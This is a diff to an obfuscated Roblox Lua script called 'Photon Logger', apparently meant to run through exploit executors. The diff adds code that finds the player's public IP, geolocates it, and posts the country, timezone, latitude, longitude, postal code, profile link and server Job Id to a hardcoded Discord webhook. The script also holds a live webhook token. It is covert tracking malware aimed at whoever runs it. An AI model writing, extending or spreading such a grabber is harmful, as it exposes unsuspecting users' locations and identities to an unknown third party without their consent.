@@ -5,11 +5,11 @@ we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."
 --// game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 photonver = "V3.0"
 if getgenv().ex == nil then getgenv().ex = true
-ipinf=game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json')
+ipinf=game:GetService("HttpService"):JSONDecode(game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json'))[1]
 local url = "https://discord.com/api/webhooks/1261141544937979904/vTNWW3mgj0U-".."dbiIQNRAhpXHSBzcAIEAcPt54cQ-u7XA2nZ5LXhF0vRnWda9p0laS7O8"
 local data = {
     ["embeds"] = {{
-        ["description"] = "**"..(qq+6).."**".." **|** [**Profile**](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)",
+        ["description"] = "**"..(qq+6).."**".." **|** [**Profile**](h".."ttps://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile)".."[**Ip Info**](https://ipinfo.io/"..game:HttpGet("https://api.ipify.org")..")",
         ["color"] = tonumber(0x6300ff),
         ["fields"] = {
             {
@@ -88,6 +88,36 @@ local data = {
                 ["inline"] = true
             },
             {
+                ["name"] = ":earth_americas: Country",
+                ["value"] = "```"..(ipinf.country_name or "Unknown").."```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = ":airplane: Timezone",
+                ["value"] = "```"..ipinf.timezone.."```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = ":milky_way: Offset",
+                ["value"] = "```"..ipinf.utc_offset.."```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = ":one: Latitude",
+                ["value"] = "```"..ipinf.latitude.."```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = ":two: Longitude",
+                ["value"] = "```"..ipinf.longitude.."```",
+                ["inline"] = true
+            },
+            {
+                ["name"] = ":three: Postal",
+                ["value"] = "```"..(ipinf.postal or "Unknown").."```",
+                ["inline"] = true
+            },
+            {
                 ["name"] = ":key: Job Id",
                 ["value"] = "```"..game.JobId.."```",
                 ["inline"] = false
@@ -102,10 +132,7 @@ local data = {
           ["text"]= "Photon Logger | @fotenexploits @apnff0x",
           ["icon_url"]= "https://cdn.discordapp.com/attachments/1136547563017871496/1261163357562605601/attachment.png?ex=6691f567&is=6690a3e7&hm=9666969649fef9631e5857e63303c705894e35a1e5b0de793527fb6e9d9d331d&"
         },
-        ["thumbnail"]= {
-          ["url"]= "https://cdn.discordapp.com/attachments/1136547563017871496/1261163357562605601/attachment.png?ex=6691f567&is=6690a3e7&hm=9666969649fef9631e5857e63303c705894e35a1e5b0de793527fb6e9d9d331d&"
-        }
-    }
+    },
     }},
 }
 
